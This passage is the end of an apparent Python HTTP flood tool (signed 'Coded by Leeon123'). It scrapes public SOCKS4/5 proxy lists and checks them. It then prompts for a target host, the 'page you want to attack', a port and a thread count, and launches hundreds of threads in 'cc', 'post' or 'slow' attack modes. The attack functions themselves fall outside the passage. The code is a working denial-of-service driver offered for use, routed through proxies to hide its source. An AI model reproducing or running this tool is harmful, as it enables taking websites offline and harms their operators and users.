			th = threading.Thread(target=checking,args=(lines,4,ms,))
			th.start()
		thread_list.append(th)
		time.sleep(0.01)
		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
		sys.stdout.flush()
	for th in list(thread_list):
		th.join()
		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
		sys.stdout.flush()
	print("\r\n> Checked all proxies, Total Worked:"+str(len(proxies)))
	ans = input("> Do u want to save them in a file? (y/n, default=y)")
	if ans == "y" or ans == "":
		if choice == "4":
			with open("socks4.txt", 'wb') as fp:
				for lines in list(proxies):
					fp.write(bytes(lines,encoding='utf8'))
			fp.close()
			print("> They are saved in socks4.txt.")
		elif choice == "5":
			with open("socks5.txt", 'wb') as fp:
				for lines in list(proxies):
					fp.write(bytes(lines,encoding='utf8'))
			fp.close()
			print("> They are saved in socks5.txt.")
			
def check_list(socks_file):
	print("> Checking list")
	temp = open(socks_file).readlines()
	temp_list = []
	for i in temp:
		if i not in temp_list:
			temp_list.append(i)
	rfile = open(socks_file, "wb")
	for i in list(temp_list):
		rfile.write(bytes(i,encoding='utf-8'))
	rfile.close()

def main():
	global ip
	global url2
	global port
	global proxies
	global multiple
	global choice
	ip = ""
	port = ""
	print("> Mode: [cc/post/slow/check]")
	mode = str(input("> Choose Your Mode (default=cc) :"))
	if mode == "":
		mode = "cc"
	ip = str(input("> Host/Ip:"))
	if ip == "":
		print("> Plese enter correct host or ip")
		sys.exit(0)
	if mode == "slow" or mode == "check":
		pass
	else:
		url = str(input("> Page you want to attack(default=/):"))
		if url == "":
			url2 = "/"
		else:
			url2 = url
	port = str(input("> Port(Https is 443):"))
	if port == '':
		port = int(80)
		print("> Default choose port 80\r\n> Port 80 was chosen")
	else:
		port = int(port)
		if str(port) == '443':
			print("> [!] Enable SSL Mode")
	choice = ""
	while choice == "":
		choice = str(input("> Choose your socks mode(4/5, default=5):")).strip()
		if choice == "":
			choice = "5"
		if choice != "4" and choice != "5":
			print("> [!] Error Choice try again")
		if choice == "4":
			socks_type = 4
		else:
			socks_type = 5
	if mode == "check":
		N = str(input("> Do you need to get socks list?(y/n,default=y):"))
		if N == 'y' or N == "" :
			if choice == "4":
				f = open("socks4.txt",'wb')
				try:
					r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all&timeout=1000")
					f.write(r.content)
				except:
					pass
				try:
					r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4")
					f.write(r.content)
					f.close()
				except:
					f.close()
				try:#credit to All3xJ
					req = urllib.request.Request("https://www.socks-proxy.net/")
					req.add_header("User-Agent", random.choice(useragents))
					sourcecode = urllib.request.urlopen(req)
					part = str(sourcecode.read())
					part = part.split("<tbody>")
					part = part[1].split("</tbody>")
					part = part[0].split("<tr><td>")
					proxies = ""
					for proxy in part:
						proxy = proxy.split("</td><td>")
						try:
							proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
						except:
							pass
					out_file = open("socks4.txt","a")
					out_file.write(proxies)
					out_file.close()
				except:
					pass
				print("> Have already downloaded socks4 list as socks4.txt")
			if choice == "5":
				f = open("socks5.txt",'wb')
				try:
					r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all")
					f.write(r.content)
				except:
					pass
				try:
					r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5")
					f.write(r.content)
					f.close()
				except:
					f.close()
				print("> Have already downloaded socks5 list as socks5.txt")
		else:
			pass
		if choice == "4":
			out_file = str(input("> Socks4 Proxy file path(socks4.txt):"))
			if out_file == '':
				out_file = str("socks4.txt")
			else:
				out_file = str(out_file)
			check_list(out_file)
			proxies = open(out_file).readlines()
		elif choice == "5":
			out_file = str(input("> Socks5 Proxy file path(socks5.txt):"))
			if out_file == '':
				out_file = str("socks5.txt")
			else:
				out_file = str(out_file)
			check_list(out_file)
			proxies = open(out_file).readlines()
		print ("> Number Of Socks%s Proxies: %s" %(choice,len(proxies)))
		time.sleep(0.03)
		ans = str(input("> Do u need to check the socks list?(y/n, defualt=y):"))
		if ans == "":
			ans = "y"
		if ans == "y":
			ms = str(input("> Delay of socks(seconds, default=1):"))
			if ms == "":
				ms = int(1)
			else :
				try:
					ms = int(ms)
				except :
					ms = float(ms)
			check_socks(ms)
		print("> End of process")
		return
	if mode == "slow":	
		thread_num = str(input("> Connections(default=400):"))
	else:
		thread_num = str(input("> Threads(default=400):"))
	if thread_num == "":
		thread_num = int(400)
	else:
		try:
			thread_num = int(thread_num)
		except:
			sys.exit("Error thread number")
	N = str(input("> Do you need to get socks list?(y/n,default=y):"))
	if N == 'y' or N == "" :
		if choice == "4":
			f = open("socks4.txt",'wb')
			try:
				r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all&timeout=1000")
				f.write(r.content)
			except:
				pass
			try:
				r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4")
				f.write(r.content)
				f.close()
			except:
				f.close()
			try:#credit to All3xJ
				req = urllib.request.Request("https://www.socks-proxy.net/")
				req.add_header("User-Agent", random.choice(useragents))
				sourcecode = urllib.request.urlopen(req)
				part = str(sourcecode.read())
				part = part.split("<tbody>")
				part = part[1].split("</tbody>")
				part = part[0].split("<tr><td>")
				proxies = ""
				for proxy in part:
					proxy = proxy.split("</td><td>")
					try:
						proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
					except:
						pass
				out_file = open("socks4.txt","a")
				out_file.write(proxies)
				out_file.close()
			except:
				pass
			print("> Have already downloaded socks4 list as socks4.txt")
		if choice == "5":
			f = open("socks5.txt",'wb')
			try:
				r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all")
				f.write(r.content)
			except:
				pass
			try:
				r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5")
				f.write(r.content)
				f.close()
			except:
				f.close()
			print("> Have already downloaded socks5 list as socks5.txt")
	else:
		pass
	if choice == "4":
		out_file = str(input("> Socks4 Proxy file path(socks4.txt):"))
		if out_file == '':
			out_file = str("socks4.txt")
		else:
			out_file = str(out_file)
		check_list(out_file)
		proxies = open(out_file).readlines()
	elif choice == "5":
		out_file = str(input("> Socks5 Proxy file path(socks5.txt):"))
		if out_file == '':
			out_file = str("socks5.txt")
		else:
			out_file = str(out_file)
		check_list(out_file)
		proxies = open(out_file).readlines()
	print ("> Number Of Socks%s Proxies: %s" %(choice,len(proxies)))
	time.sleep(0.03)
	ans = str(input("> Do u need to check the socks list?(y/n, defualt=y):"))
	if ans == "":
		ans = "y"
	if ans == "y":
		ms = str(input("> Delay of socks(seconds, default=1):"))
		if ms == "":
			ms = int(1)
		else :
			try:
				ms = int(ms)
			except :
				ms = float(ms)
		check_socks(ms)
	if mode == "slow":
		input("Press Enter to continue.")
		th = threading.Thread(target=slow,args=(thread_num,socks_type,))
		th.setDaemon(True)
		th.start()
	else:
		multiple = str(input("> Input the Magnification(default=100):"))
		if multiple == "":
			multiple = int(100)
		else:
			multiple = int(multiple)
		input("Press Enter to continue.")
		if mode == "post":
			for _ in range(thread_num):
				th = threading.Thread(target = post,args=(socks_type,))
				th.setDaemon(True)
				th.start()
				#print("Threads "+str(i+1)+" created")
		elif mode == "cc":
			for _ in range(thread_num):
				th = threading.Thread(target = cc,args=(socks_type,))
				th.setDaemon(True)
				th.start()
					#print("Threads "+str(i+1)+" created")
	try:
		while True:
			pass
	except KeyboardInterrupt:
		sys.exit()
	

if __name__ == "__main__":
	main()#Coded by Leeon123
